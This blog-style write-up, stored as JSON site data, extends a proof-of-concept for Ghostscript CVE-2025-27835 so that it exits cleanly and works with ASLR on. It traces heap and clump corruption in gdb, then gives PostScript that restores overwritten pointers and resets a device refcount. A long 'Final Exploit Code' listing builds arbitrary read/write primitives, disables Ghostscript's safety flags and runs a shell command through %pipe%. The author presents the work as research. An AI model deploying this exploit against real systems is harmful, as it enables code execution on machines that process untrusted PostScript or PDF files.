
[{"content":"","date":"27 June 2025","externalUrl":null,"permalink":"/tags/ghostscript/","section":"Tags","summary":"","title":"Ghostscript","type":"tags"},{"content":"This article continues off of the PoC Report of Ghostscript CVE-2025-27835 article before this one. I recommend reading that article first to understand the vulnerability and the exploit.\nIf you remember from the previous article, the goal was to make the exploit useful in a real-world scenario as if someone wanted to use it. The original PoC ended with an infinite loop after command execution and would segfault when the infinite loop was rmeoved. Although we theorized some ideas, we were not able to figure out how to make it work as we ran out of time, so I decided to continue working on it just for fun.\nUnderstanding the Crash # The first step was to understand why the exploit would crash after command execution. I started by commenting out/removing the infinite loop at the end of the exploit and running it until the crash in gdb. When running a postscript file in Ghostscript, most of the work is done in interp function inside interp.c. from parsing the input to defining variables and executing operators on them. When the interpreter detects that it should stop (such as with the quit operator) it returns from the interp function back to main.\n// /psi/gs.c 68 int main(int argc, char *argv[]) { ... 94 if (code \u0026gt;= 0) 95 code = gsapi_init_with_args(minst, argc, argv); ... 119 if (code == 0) 120 code = gsapi_run_string(minst, start_string, 0, \u0026amp;exit_status); 121 122 exit_status = gsapi_exit(minst); 123 if( code \u0026gt;= 0 \u0026amp;\u0026amp; exit_status \u0026lt; 0) 124 code = exit_status; ... 150 return exit_status; 151 } The interp function is called from gsapi_init_with_args in line 95 of gs.c which is where most of the code execution happens from the PoC. When Ghostscript gets to the quit operator at the end of the PoC, it returns from interp back to main and then calls gsapi_exit in line 122 to invoke the garbage collector and free all allocated memory before gracefully exiting.\n(exec) = flush (%pipe%ls -laf) (w) file (done) = %{ 1 pop } loop quit Stopping at the line before the crash and looking at the backtrace it seems the issue is happening in gc_objects_clear_marks.\n605 /* Unmark the objects in a clump. */ 606 static void 607 gc_objects_clear_marks(const gs_memory_t *mem, clump_t * cp) 608 { 609 if_debug_clump(\u0026#39;6\u0026#39;, mem, \u0026#34;[6]unmarking clump\u0026#34;, cp); 610 SCAN_CLUMP_OBJECTS(cp) 611 DO_ALL 612 struct_proc_clear_marks((*proc)) = 613 pre-\u0026gt;o_type-\u0026gt;clear_marks; 614 #ifdef DEBUG 615 if (pre-\u0026gt;o_type != \u0026amp;st_free) 616 debug_check_object(pre, cp, NULL); 617 #endif 618 if_debug3m(\u0026#39;7\u0026#39;, (const gs_memory_t *)mem, \u0026#34; [7](un)marking %s(%lu) \u0026#34;PRI_INTPTR\u0026#34;\\n\u0026#34;, 619 struct_type_name_string(pre-\u0026gt;o_type), 620 (ulong) size, (intptr_t)pre); 621 o_set_unmarked(pre); 622 if (proc != 0) 623 (*proc) (mem, pre + 1, size, pre-\u0026gt;o_type); 624 END_OBJECTS_SCAN 625 } The segfault occurs when attempting to run line 612:\nstruct_proc_clear_marks((*proc)) = pre-\u0026gt;o_type-\u0026gt;clear_marks;\nThe comment above the function says that its purpose is to unmark objects in a clump. From the last article, I know that clumps are large allocations for objects that Ghostscript manages such as large buffers or arrays for Postscript defined variables. Printing out the data sturcture of a clump shows:\nI wasn\u0026rsquo;t really sure what each field meant or what it was for. So I decided to look into the line that crashed. There are a lot of macros in the code that I couldn\u0026rsquo;t understand but gdb has a really useful command called macro expand that can be used to expand macros (if I recall correctly, this command only works when debugging with the -g3 flag). Expanding lines 610 to 613 where the crash happens shows:\nobj_header_t *pre = (obj_header_t *)((cp)-\u0026gt;cbase); obj_header_t *end = (obj_header_t *)((cp)-\u0026gt;cbot); uint size; for ( ; pre \u0026lt; end; pre = (obj_header_t *)((char *)pre + (obj_size_t)((((size) + sizeof(obj_header_t)) + (((((((8 - 1) | (8 - 1) | (8 - 1)) + 1) - 1) | ((1 \u0026lt;\u0026lt; 3) - 1) | ((1 \u0026lt;\u0026lt; 1) - 1)) + 1)-1)) \u0026amp; -((((((8 - 1) | (8 - 1) | (8 - 1)) + 1) - 1) | ((1 \u0026lt;\u0026lt; 3) - 1) | ((1 \u0026lt;\u0026lt; 1) - 1)) + 1))) ) { size = ((pre)-\u0026gt;d.o.size); struct_proc_clear_marks((*proc)) = pre-\u0026gt;o_type-\u0026gt;clear_marks; } The SCAN_CLUMP_OBJECTS macro is used to iterate over all objects in a clump until the end of the clump is reached. The DO_ALL macro is used to set the size variable to the size of the current object. At the start, pre is set to the clump\u0026rsquo;s cbase field which I can only assume is the start of the clump in memory and the end variable is set to the clump\u0026rsquo;s cbot field which I\u0026rsquo;m also assuming is the end of the clump in memory. When looking at the data type of cbase and cbot they are both byte* but the macro is casting them to obj_header_t*. Looking at the obj_header_t struct shows its just a union:\nThe union is filled with many more data types that I would need to manually print out since ptype does not recursively print out the data types. So I\u0026rsquo;ll just print out pre with its type next to it in parenthesis from the ptype command:\npwndbg\u0026gt; p *pre $3 = { (union _d) d = { (obj_header_data_t) o = { (union _f) f = { (struct _h) h = { (unsigned int) alone = 0, (unsigned int) pad = 0 }, (struct _m) m = { (unsigned int) _ = 0, (unsigned int) smark = 0 }, (struct _b) b = { (unsigned int) _ = 0, (unsigned int) back = 0 } }, (obj_size_t) size = 1400, (union _t) t = { (gs_memory_type_ptr_t) type = 0x555557676ac0 \u0026lt;st_alloc_save\u0026gt;, (size_t) reloc = 93825026976448 } }, (byte) _pad = \u0026#34;\\000\\000\\000\\000x\\005\\000\\000\\300jgWUU\\000\u0026#34; } } Knowing this, I can see that after size is set to pre-\u0026gt;d.o.size, the next line that crashes is attempting to set a function pointer proc to pre-\u0026gt;d-\u0026gt;o-\u0026gt;t-\u0026gt;type. In the output above, that pointer is set to st_alloc_save and the output is from a valid clump before the crash.\nLooking at pre right before the crash shows that something is wrong:\npre is set to all zeros which means that the cbase field of the clump is set incorrectly. Since I didn\u0026rsquo;t know why this was happening, it\u0026rsquo;s time to go up to the caller of this function.\n// /psi/igc.c 267 for_collected_spaces(ispace) 268 for_space_clumps(ispace, mem, cp, \u0026amp;sw) { 269 gc_objects_clear_marks((const gs_memory_t *)mem, cp); 270 gc_strings_set_marks(cp, false); 271 } Again, more macros. Expanding the macros shows:\nfor (ispace = min_collect; ispace \u0026lt;= max_trace; ++ispace) { for (mem = space_memories[ispace]; mem != 0; mem = \u0026amp;mem-\u0026gt;saved-\u0026gt;state) { for (cp = clump_splay_walk_init(\u0026amp;sw, mem); cp != 0; cp = clump_splay_walk_fwd(\u0026amp;sw)) { gc_objects_clear_marks((const gs_memory_t *)mem, cp); gc_strings_set_marks(cp, false); } } } Since cbase is corrupted, that means that the clump itself is corrupted. The for loop is iterating over all clumps in all memory spaces and clearing the marks on all objects in the clump. cp is originally set from clump_splay_walk_init and iterated on by the clump_splay_walk_fwd function. A splay tree is a type of data structure that moves recently accessed nodes closer to the root of the tree for faster access which Ghostscript seems to use for clumps. I won\u0026rsquo;t go into the details of how Ghostscript uses splay trees but I will say that when setting the next clump with clump_splay_walk_fwd, it sets cp to an invalid pointer meaning that the pointer to the next clump is corrupted meaning that the splay tree is corrupted.\nHow did this happen? Well I went up the call stack again to the caller to see what is wrong but with no luck. I scraped this idea and thought of a different approach. Since I now know that a pointer to a clump is corrupted, I knew this had to be because of the buffer overflow. So I went back and looked at the hexdump of the memory between SOURCE1 and SOURCE2 before and after the buffer overflow.\nA New Approach # As a brief aside, I am using and have been using gdb with ASLR off so that I can get consistent addresses and know where everything is in memory across multiple runs which is why pointers in images always look similar.\nSo the corrupted pointer is one of the 5 pointers in the image above. The most logical thing for me to do next was to set the memory back to what it was before the overflow after the overflow. I set a breakpoint right before the overflow, printed the hexdump, moved to the next instruction, and then set the memory back to what it was before the overflow.\nset {long} 0x7ffff3688008=0x00000000004c5002 set {long} 0x7ffff3688010=0x0000555557acff70 set {long} 0x7ffff3688018=0x0000555557acfd70 set {long} 0x7ffff3688020=0x00000000004c4b78 set {long} 0x7ffff3688028=0x000055555702ba00 set {long} 0x7ffff3688030=0x0000555556e6b671 And it seemed to work:\nWhy does this work? Well, I stopped at the line that would usually crash the program after I set the memory back to what it was before the overflow and cp was set to a valid pointer meaning pre was also valid. I\u0026rsquo;m not sure how I didn\u0026rsquo;t catch this earlier but the pointer that caused cbase to be corrupted was the address 0x7ffff3688058. And if you look at the hexdump above, that address is one of the 5 pointers that are overwritten by the overflow.\nCorrupted cp pointer:\nFixed cp pointer after setting the memory back:\npre after fixing corrupted pointer:\nSo this means that the overflow fills up the header/metadata of a clump between SOURCE1 and SOURCE2, causing it to crash when the garbage collector attempts to remove the marks from each clump after it attempts to access a corrupted clump.\nPrinting out cp shows that address 0x7ffff3688058 is cbase but it also shows that 0x7ffff3688040 is chead. I don\u0026rsquo;t know what chead is since the hexdump shows there is no data between 0x7ffff3688040 and 0x7ffff3688058, its just filled with zeros. But this checks off what one of the 5 unknown pointers in the hexdump above.\nWriting to Arbitrary Memory # Getting the Address to Write To # Great, the next step was to write Postscript after the command execution to get Ghostscript to exit gracefully. The exploit author has already defined custom function ptradd, copystr, arbwr, and arbrd. The first step is getting a variable to store the pointer to where I want to write which is 0x7ffff3688008. I can use the ptradd function to do this but I have no idea what to add to or how much to add since I don\u0026rsquo;t know what some of the other variables such as head and next when it was disabling the flag.\nSince the first pointer in that hexdump is at 0x7ffff3688010, I decided to try to get a Postscript variable to hold that address. After lots of searching in gdb, I found all pointer chains that led to that address:\n0x5555579bf478 —▸ 0x555557c1f6d0 —▸ 0x555557af9030 —▸ 0x555557a14c80 —▸ 0x555557af8e30 —▸ 0x555557af82e0 —▸ 0x555557af81e0 —▸ 0x7ffff3688010 0x555557af9038 —▸ 0x555557c1f6d0 —▸ 0x555557af9030 —▸ 0x555557a14c80 —▸ 0x555557af8e30 —▸ 0x555557af82e0 —▸ 0x555557af81e0 —▸ 0x7ffff3688010 0x7ffff3688018 —▸ 0x555557af81e0 —▸ 0x7ffff3688010 0x555557af8f38 —▸ 0x7ffff3688010 Now I needed to check if any of the Postscript vairables in the exploit were pointing to any of these addresses after overwriting the flag. Sadly, none of the variables were pointing to any of these addresses. If you remmeber from the previoud article, I printed out the entire linked list of the malloc chunk header that the exploit traverses to disable the flag. The string that the exploit is looking for gs_lib_ctx_init(core) ends up being in the third to last malloc chunk in the linked list, which leaves head pointing to the third to last malloc chunk header pointer in the linked list and next pointing to the second to last.\nThis is corroborated by the fact that the values of next and head are the correct pointers 0x5555579bf520 and 0x5555579bf610 respectively:\nAfter no luck of having any of the variables be a pointer I needed, I went back to looking at the malloc chunk header linked list. I noticed that the value of 0x5555579bf4b0 of the last chunk or the value of next of the penultimate chunk is close to the value of the first pointer in the first pointer chain from earlier (0x5555579bf478). I tested with ASLR on and off and the difference between these two values is always 0x38 which means I can reliably use it. So I added to the exploit code to iterate through the linked list once more which gets next to point to 0x5555579bf478. After that I call ptradd on next to add -56 to it which gets me to the address 0x5555579bf4b0.\n(%pipe%ls) (w) file (done) = flush %{ 1 pop } loop /head next def head next arbrd /ptr3 next -56 ptradd def After getting next to hold the first pointer in the chain, I just need to walk the pointer chain and keep dereferencing the pointer until I reach the pointer that points to the overflowed address. As a reminder this is the pointer chain I\u0026rsquo;m walking:\n0x5555579bf478 ↓ 0x555557c1f6d0 ↓ 0x555557af9030 ↓ 0x555557a14c80 ↓ 0x555557af8e30 ↓ 0x555557af82e0 ↓ 0x555557af81e0 ↓ 0x7ffff3688010 A simple for loop in Postscript similar to the one used to walk the malloc chunk header linked list works:\n/ptr3 next -56 ptradd def /buf2 8 string def 8 { ptr3 buf2 arbrd /ptr3 buf2 def } repeat Writing to the Address # Great, now I have a Postscript variable ptr3 and buf2 that holds the address of where to write to. Next is figuring out what to write. Easy, for now I can just copy what the hexdump showed was there before the overflow, and then do this for all 5 pointers plus the 3 clumps of bytes in between using the ptradd and arbwr functions. There was probably a better way to do this but I just wanted to get it working:\nptr3 \u0026lt;308faf5755550000\u0026gt; arbwr /ptr4 ptr3 -8 ptradd def ptr4 \u0026lt;02504c0000000000\u0026gt; arbwr /ptr5 ptr3 16 ptradd def ptr5 \u0026lt;784b4c0000000000\u0026gt; arbwr /ptr6 ptr3 24 ptradd def ptr6 \u0026lt;00ba025755550000\u0026gt; arbwr /ptr7 ptr3 32 ptradd def ptr7 \u0026lt;71b6e65655550000\u0026gt; arbwr /ptr8 ptr3 72 ptradd def ptr8 \u0026lt;01000000504b4c00\u0026gt; arbwr /ptr9 ptr3 80 ptradd def ptr9 \u0026lt;6064035755550000\u0026gt; arbwr Since ptr3 held the address 0x7ffff3688008, I just used ptradd to add the correct offset to get the other memory locations to write to. After this, I ran the exploit to completion in gdb:\nI added some print statements in there for debugging purposes but what does that second to last line say?\nError: finalizing subclassing device while child refcount \u0026gt; 1\nThis is a new error that I haven\u0026rsquo;t seen before and its weird that it shows up now but it didn\u0026rsquo;t when I manually set the memory back to what it was before the overflow using gdb. Regardless, the program did not crash and exited gracefully. Also I should mention, even though I iterated once more in the malloc chunk header linked list, I actually could have just used the head or next variable since they were already close and at the same offset away. The reason I didn\u0026rsquo;t do this was I had thought that the ptradd function only worked for adding or subtracting at most a byte in which I could have just called ptradd in a loop to get the desired pointer. This is why I searched for a pointer that was closer to the address but its too late now.\nTurning ASLR On # Although I achieved my goal of getting Ghosscript to not crash, it\u0026rsquo;s still not usable since this is all done with ASLR off. The next step was obvious, stop hardcoding the 5 pointers and figure out what they were before the overflow. The custom defined functions copystr, ptradd, arbwr, and arbrd don\u0026rsquo;t work until the overflow happens since they work on strings and the overflow is what allows me to write to arbitrary memory since it changes the type of OBJARR to a string. This means that there is no way of determining the values of the 5 pointers before the overflow happens and I had to figure out what they were after the overflow. I tried searching for the values of the pointers in gdb after the overflow and I couldn\u0026rsquo;t find a single thing, not even one pointer.\nIt was at this point I thought about just leaving it at that and having this be a ASLR off exploit. But something told me that this was still possible so I kept digging and I\u0026rsquo;m glad I did. I went back to the hexdump before and after the overflow to see if there was anything similar that I was missing and that\u0026rsquo;s when I saw it:\nBefore: After: Although none of the pointers in the hexdump after were originally in the hexdump before, there is a pointer in the after hexdump that is very close to one in the before hexdump. The pointer at address 0x7ffff3688018 before the overwrite is also at 0x7ffff373efe0 after the overwrite but with a difference of 0x400. I eagerly enabled ASLR to see if this was the case and the pointer was always 0x400 away each time. If I can read what\u0026rsquo;s at that address, then I can easily get the value of the pointer to set it back.\nNot only that, the values before the overwrite at addresses 0x7ffff3688010 (0x555557af8f30) and 0x7ffff3688018 (0x555557af81e0) are also always at a difference of 0xD50 away from eachother. So this means once I get the value at address 0x7ffff373efe0, I can also set the value of the pointer that goes before it.\nNow this is great an all, but theres still 3 more pointers that I need to figure out as well as the 3 clumps of bytes in between. Luckily I printed out whats at the addresses before the overflow and pwndbg easily resolves these pointers to symbols:\nThe two pointers at 0x7ffff3688010 and 0x7ffff3688018 are the ones I already mentioned. For the next two pointers, pwndbg resolves them as global variables (st_bytes) and 'large object clump' which are also always at the same offset from the base address. The problem is that I don\u0026rsquo;t know the base address, I can only arbitrarily read and write. So how am I going to figure out what this pointer is each time? Well, I printed out the memory that the hexdump after the overflow identifies and noticed something else useful:\nWell thats not useful, the data got copied at a weird offset. Let\u0026rsquo;s take a look at it shifted up 2 bytes:\nWell, (st_bytes) is present in the memory after the overflow so thats an easy fix. And although 'large object clump' is not present, 'large_string_clump' is which is now a known global variable. Since I now always know where 'large_string_clump' is, I can just calculate the offset to 'large object clump' which is 0x13.\nTheres one more pointer left, the one at 0x7ffff3688060 which pwndbg resolves to (st_refs). I can use the same trick I did to get the address of 'large object clump' using the address of (st_bytes). The difference between the two is 0xAA60.\nNow that all 5 pointers have been identified and I have a way of getting their values, the next thing is to figure out what those 3 clumps of bytes are in between the pointers. This turned out to be very easy as first clump of bytes is 0x4c5002, and when I checked with ASLR that value was always the same so I can just harcode it. The next clump of bytes is 0x4c4b78 which is also always the same like the first clump. And the same thing goes for the last clump of bytes which is 4c4b5000000001. I don\u0026rsquo;t know what these values are for or what they represent, I just know that they are always the same so I can just hardcode them in the exploit.\nThere is one more interesting finding before I begin showing how I fixed the exploit. For some reason, the pointer 0x555557af81e0 seems to reappear after the overflow at address 0x7ffff3688018 which is where it was before the overflow. I don\u0026rsquo;t know why this is the case or when this happens but now I can use it instead of grabbing that same pointer at 0x7ffff373efe0 and subtracting 0x400 from it\nThe first thing I did was get the reappeared pointer at 0x7ffff3688018 and subtract 0xD50 from it to get the pointer at 0x7ffff3688010.\n/ptr4 ptr3 8 ptradd def /buf3 8 string def ptr4 buf3 arbrd /buf4 buf3 3408 ptradd def ptr3 buf4 arbwr First, ptr3 holds the value of the address 0x7ffff3688010 or the first pointer in the hexdump after the overflow. Then I set ptr4 to ptr3 + 8 which is 0x7ffff3688018. A new variable buf3 is created and hold the pointer at ptr4 using arbrd. Now that buf3 holds the pointer at 0x7ffff3688018, I can use ptradd to add 0xD50 to buf3 to get the pointer at 0x7ffff3688010 and store it in buf4. Finally, I write the value of buf4 to ptr3 which is the first pointer in the hexdump after the overflow.\nThe next step is to fix the two memory clumps before and after those two pointers which is straightforward:\n/ptr5 ptr3 -8 ptradd def ptr5 \u0026lt;02504c0000000000\u0026gt; arbwr /ptr6 ptr3 16 ptradd def ptr6 \u0026lt;784b4c0000000000\u0026gt; arbwr This just subtracts 8 and adds 16 to ptr3 to get the addresses of the two clumps of bytes and writes the values to them since they are always the same.\nThe next step is to set (st_bytes) and ('large object clump') to the correct values. Both follow the same pattern:\n/ptr7 ptr3 24 ptradd def /buf5 8 string def ptr3 749546 ptradd buf5 arbrd ptr7 buf5 arbwr /ptr8 ptr3 32 ptradd def /buf6 8 string def ptr3 749554 ptradd buf6 arbrd ptr8 buf6 19 ptradd arbwr Again I add from ptr3 to get the addresses of the two pointers to write to. Then I read the value at ptr3 + 749546 which is the address of (st_bytes) at 0x7ffff373effa, store it in buf5, and write it to ptr7. The same thing is done for but this time it gets the address of 'large string clump' at 0x7ffff373f002 and stores it in buf6. After that I add 0x13 to buf6 to get the address of 'large object clump' and then write it to ptr8.\nThen I fix the last clump of bytes at 0x7ffff3688058 like before:\n/ptr9 ptr3 72 ptradd def ptr9 \u0026lt;01000000504b4c00\u0026gt; arbwr The last thing to do is set (st_refs) to the correct value which I do by getting the address of (st_bytes) and adding 0xAA60 to it:\n/ptr10 ptr3 80 ptradd def ptr10 buf5 43616 ptradd arbwr I used buf5 since it already holds the address of (st_bytes).\nNow if I test the exploit with ASLR on, it works!\nBut I stil get the same refcount error as before. My first thought was can I overwrite a function pointer so that Ghostscript just terminates without even getting the chance to show me the error? I quickly scraped that idea. I wasn\u0026rsquo;t sure if this was being printed because I compiled Ghostscript with debug symbols or if it was actually an error so I investigated it. If I try to run the exploit but with the Postscript file in a different directory, instead of a refcount error I get a segfault:\nFixing the Refcount Error # I found the line where the error was being printed in:\n0 restore_finalize (mem=0x5555579c2248) at ./psi/isave.c:954 1 0x0000555556392e7a in alloc_restore_all (i_ctx_p=0x5555579f34a8) at ./psi/isave.c:899 2 0x000055555632a46d in gs_main_finit (minst=0x5555579bfd90, exit_status=0, env_code=0) at ./psi/imain.c:1407 3 0x000055555632a772 in gs_to_exit_with_code (mem=0x5555579bf390, exit_status=0, code=0) at ./psi/imain.c:1450 4 0x000055555632a79d in gs_to_exit (mem=0x5555579bf390, exit_status=0) at ./psi/imain.c:1455 5 0x000055555633100d in psapi_exit (ctx=0x5555579bf550) at ./psi/psapi.c:517 6 0x000055555646b84c in gsapi_exit (instance=0x5555579bf550) at ./psi/iapi.c:440 7 0x000055555581419d in main (argc=5, argv=0x7fffffffe2f8) at ./psi/gs.c:122 This happens in the restore_finalize function in isave.c:\n// /psi/isave.c /* * Finalize objects that will be freed by a restore. * Note that we must temporarily disable the freeing operations * of the allocator while doing this. */ 937 static void 938 restore_finalize(gs_ref_memory_t * mem) 939 { 940 clump_t *cp; 941 clump_splay_walker sw; 942 943 alloc_close_clump(mem); 944 gs_enable_free((gs_memory_t *) mem, false); 945 for (cp = clump_splay_walk_bwd_init(\u0026amp;sw, mem); cp != 0; cp = clump_splay_walk_bwd(\u0026amp;sw)) { 946 SCAN_CLUMP_OBJECTS(cp) 947 DO_ALL 948 struct_proc_finalize((*finalize)) = 949 pre-\u0026gt;o_type-\u0026gt;finalize; 950 if (finalize != 0) { 951 if_debug2m(\u0026#39;u\u0026#39;, (gs_memory_t *)mem, \u0026#34;[u]restore finalizing %s \u0026#34;PRI_INTPTR\u0026#34;\\n\u0026#34;, 952 struct_type_name_string(pre-\u0026gt;o_type), 953 (intptr_t) (pre + 1)); 954 (*finalize) ((gs_memory_t *) mem, pre + 1); 955 } 956 END_OBJECTS_SCAN 957 } 958 gs_enable_free((gs_memory_t *) mem, true); 959 } This actually looks very similar with the same macro calls as the gc_objects_clear_marks function that I looked at earlier. This time, its going through all the objects in a clump and calling the finalize function on each object. Printing out the value of finalize on the line of the crash shows:\nSince the string that is being printed is not in this function, it must be in the default_subclass_finalize function.\n// /base/gdevsclass.c 871 void default_subclass_finalize(const gs_memory_t *cmem, void *vptr) 872 { 873 gx_device * const dev = (gx_device *)vptr; 874 generic_subclass_data *psubclass_data = (generic_subclass_data *)dev-\u0026gt;subclass_data; 875 (void)cmem; /* unused */ 876 877 discard(gs_closedevice(dev)); 878 879 if (dev-\u0026gt;finalize) 880 dev-\u0026gt;finalize(dev); 881 882 /* The only way we should get here is when the original device 883 * should be freed (because the subclassing device is pretending 884 * to be the original device). That being the case, all the child 885 * devices should have a reference count of 1 (referenced only by 886 * their parent). Anything else is an error. 887 */ 888 if (dev-\u0026gt;child != NULL) { 889 if (dev-\u0026gt;child-\u0026gt;rc.ref_count != 1) { 890 dmprintf(dev-\u0026gt;memory, \u0026#34;Error: finalizing subclassing device while child refcount \u0026gt; 1\\n\u0026#34;); 891 while (dev-\u0026gt;child-\u0026gt;rc.ref_count != 1) 892 rc_decrement_only(dev-\u0026gt;child, \u0026#34;de-reference child device\u0026#34;); 893 } 894 rc_decrement(dev-\u0026gt;child, \u0026#34;de-reference child device\u0026#34;); 895 } 896 897 if (psubclass_data) { 898 gs_free_object(dev-\u0026gt;memory-\u0026gt;non_gc_memory, psubclass_data, \u0026#34;gx_epo_finalize(suclass data)\u0026#34;); 899 dev-\u0026gt;subclass_data = NULL; 900 } 901 if (dev-\u0026gt;stype_is_dynamic) 902 gs_free_const_object(dev-\u0026gt;memory-\u0026gt;non_gc_memory, dev-\u0026gt;stype, 903 \u0026#34;default_subclass_finalize\u0026#34;); 904 if (dev-\u0026gt;icc_struct) 905 rc_decrement(dev-\u0026gt;icc_struct, \u0026#34;finalize subclass device\u0026#34;); 906 if (dev-\u0026gt;PageList) 907 rc_decrement(dev-\u0026gt;PageList, \u0026#34;finalize subclass device\u0026#34;); 908 if (dev-\u0026gt;NupControl) 909 rc_decrement(dev-\u0026gt;NupControl, \u0026#34;finalize subclass device\u0026#34;); 910 } The string is printed on line 890 and the comment above even says that this is an error. The reason why this is happening is because the child device has a reference count greater than 1 which means that the child device is still being used by something else. This is not a problem with the exploit, its just Ghostscript\u0026rsquo;s way of saying that the child device is still being used by something else and it can\u0026rsquo;t finalize it yet. This is actually a really easy fix, all I need to do is find where dev-\u0026gt;child-\u0026gt;rc.ref_count is in memory and set the reference count to 1.\nFor some reason, gdb doesn\u0026rsquo;t show the source code for default_subclass_finalize so I had to look at the disassembly. I see that line 877 calls gs_closedevice with dev as the argument and pwndbg shows me when the function is called as well as the address of the argument:\ndev is a pointer to a gx_device struct which is very large and has many fields. For this reason, I will not show it but I will show the relevant fields:\nThe child field is a pointer to another gx_device struct and you can see that the rc struct is also there. Printing out the value of dev-\u0026gt;child-\u0026gt;rc shows:\nTheres the issue, the reference count is 3 which is greater than 1. Printing the address of dev-\u0026gt;child-\u0026gt;rc with no ASLR shows that its at address 0x555557aa1530:\nAt this point, I start going back to the exploit code and looking at the values of the variables I created and looking to see if one of them was at a constant offset from dev-\u0026gt;child-\u0026gt;rc. It turns out that address 0x555557af8f30 is always at a constant offset of 0x57A00 from ``dev-\u0026gt;child-\u0026gt;rc`. I tested it with and without ASLR:\nWithout ASLR: 0x555557af8f30 - 0x555557aa1530 = 0x57A00\nWith ASLR: 0x56ed00b8af30 (buf4) - \u0026amp;$dev-\u0026gt;child-\u0026gt;rc = 0x57A00\n0x555557af8f30 is the address that I wrote to ptr3 earlier in the exploit code so I can just use the variable buf4 since it always holds that address. So now I can just subtract 0x57A00 from buf4 to get the address of dev-\u0026gt;child-\u0026gt;rc and then write 1 to the ref_count field:\nbuf4 -358912 ptradd \u0026lt;01\u0026gt; arbwr Im not really sure why the refcount is increased when I set the memory back before the overflow since I had already changed everything back to what it was. I even looked at the hexdump after the overflow to see if there was a random 3 since rc.ref_count was always 3 but I couldn\u0026rsquo;t find anything. Regardless, this fixes the error and now the exploit works with ASLR on:\nRemoving Debug Symbols # They only thing left I can think of is recompiling Ghostscript with debug symbols disabled to see if it still works. To be honest, I didn\u0026rsquo;t have high hopes for it working without debug symbols just because there is no way that the offsets stay the same considering -g3 provides no optimization. But I will try it anyway:\nOf coures it didn\u0026rsquo;t work, and for the same reasons I thought it wouldn\u0026rsquo;t. It took some time since I no longer had the source code to look at in gdb and I had to understand the optimized assembly that gcc generated. But I was able to figure out that the offsets two pointers needed to be changed.\n3408 in /buf4 buf3 3408 ptradd def needed to be changed to 512\n-358912 in buf4 -358912 ptradd \u0026lt;01\u0026gt; arbwr needed to be changed to -190688\nAfter changing these two offsets, the exploit works with ASLR on and no debug symbols:\nAnd now there you have it, a working Ghostscript exploit with ASLR on that works without debug symbols as if it was a real world exploit! Though this Ghostscript binary was compiled from source, modifying the exploit to work with the prebuilt binary shouldn\u0026rsquo;t be too hard. Ghostscript also allows users to specify what features they want to compile in, and modifying the exploit to work with those features should be easy as well as its most likely just a matter of changing the offsets in the exploit code.\nUnfortunately, when I tried running the exploit in different ways such as changing the directory of the Postscript to be different than the current directory or even changing the name of the Postscript file, the exploit would segfault. One thing became clear when I was testing the exploit in different scenarios, the difference between the pointer at 0x7ffff3688010 changes compared to 0x7ffff3688018. This seems to be the only thing that changes and as far as I could tell, there was no way of getting the pointer at 0x7ffff3688010. Instead of subtracting an offset from the pointer at 0x7ffff3688018, a better way would be trying to find a pointer in memory that contains the address at 0x7ffff3688010. This way, the exploit can work without having to hardcode the offset. I tried searching for the pointer at 0x7ffff3688010 in gdb and I found only one reference to it but it changes slightly across different runs. The next best thing would be trying to find a pointer that changes with the pointer at 0x7ffff3688018 or is somehow correlated to it and is always at a constant offset from it. This would require more research and looking at the Ghostscript source code and the data structures it uses. So for now I will leave it at that.\nFinal Exploit Code # % gs -q -sDEVICE=txtwrite -sOutputFile=/dev/null glyphunicode.ps 500000000 setvmthreshold /REFIDX 249888 def /REFOFS 3248640 def /STROBJ 1000 string def /ARROBJ 6250 array def /OBJARR 32 array def OBJARR 0 STROBJ put OBJARR 1 ARROBJ put /TARGET null def /MAGIC null def /STRPTR null def /ARRPTR null def % \u0026lt;dststr\u0026gt; \u0026lt;dstidx\u0026gt; \u0026lt;srcstr\u0026gt; \u0026lt;srcidx\u0026gt; \u0026lt;length\u0026gt; copystr - /copystr { /_length exch def /_srcidx exch def /_srcstr exch def /_dstidx exch def /_dststr exch def _length { _dststr _dstidx _srcstr _srcidx get put /_srcidx _srcidx 1 add def /_dstidx _dstidx 1 add def } repeat } bind def % \u0026lt;string\u0026gt; \u0026lt;int\u0026gt; ptradd \u0026lt;string\u0026gt; /ptradd { /_inc exch def /_ptr exch def /_new 8 string def 0 1 7 { /_i exch def /_b _ptr _i get _inc add def /_inc _b -8 bitshift def _new _i _b 255 and put } for _new } bind def % \u0026lt;string-address\u0026gt; \u0026lt;string-buffer\u0026gt; arbrd - /arbrd { /_buf exch def /_adr exch def STRPTR 0 _adr 0 8 copystr _buf 0 OBJARR 0 get 0 _buf length copystr } bind def % \u0026lt;string-address\u0026gt; \u0026lt;string-data\u0026gt; arbwr - /arbwr { /_buf exch def /_adr exch def STRPTR 0 _adr 0 8 copystr OBJARR 0 get 0 _buf 0 _buf length copystr } bind def /DONE { /MAGIC TARGET REFIDX get def /STRPTR MAGIC 8 8 getinterval def /ARRPTR MAGIC 24 8 getinterval def (patch) = flush /arrptr 8 string def arrptr 0 ARRPTR 0 8 copystr { /arrsz 8 string def /next arrptr -40 ptradd -48 ptradd def next 16 ptradd arrsz arbrd arrsz \u0026lt;d886010000000000\u0026gt; eq { exit } if % 100056 /next arrptr -56 ptradd -48 ptradd def next 16 ptradd arrsz arbrd arrsz \u0026lt;e886010000000000\u0026gt; eq { exit } if % 100072 (unknown header layout) = quit } loop { /head next def /next 8 string def /cname 8 string def /cname_str 21 string def head next arbrd head 32 ptradd cname arbrd cname cname_str arbrd cname_str (gs_lib_ctx_init(core)) eq { exit } if } loop /buf 4 string def /ptr1 head 188 ptradd def /ptr2 head 204 ptradd def ptr1 buf arbrd buf \u0026lt;01000000\u0026gt; eq { ptr1 \u0026lt;00000000\u0026gt; arbwr } if ptr2 buf arbrd buf \u0026lt;01000000\u0026gt; eq { ptr2 \u0026lt;00000000\u0026gt; arbwr } if (exec) = flush (%pipe%ls) (w) file (done) = flush /head next def head next arbrd /ptr3 next -56 ptradd def /buf2 8 string def 8 { ptr3 buf2 arbrd /ptr3 buf2 def } repeat /ptr4 ptr3 8 ptradd def /buf3 8 string def ptr4 buf3 arbrd /buf4 buf3 512 ptradd def ptr3 buf4 arbwr /ptr5 ptr3 -8 ptradd def ptr5 \u0026lt;02504c0000000000\u0026gt; arbwr /ptr6 ptr3 16 ptradd def ptr6 \u0026lt;784b4c0000000000\u0026gt; arbwr /ptr7 ptr3 24 ptradd def /buf5 8 string def ptr3 749546 ptradd buf5 arbrd ptr7 buf5 arbwr /ptr8 ptr3 32 ptradd def /buf6 8 string def ptr3 749554 ptradd buf6 arbrd ptr8 buf6 19 ptradd arbwr /ptr9 ptr3 72 ptradd def ptr9 \u0026lt;01000000504b4c00\u0026gt; arbwr 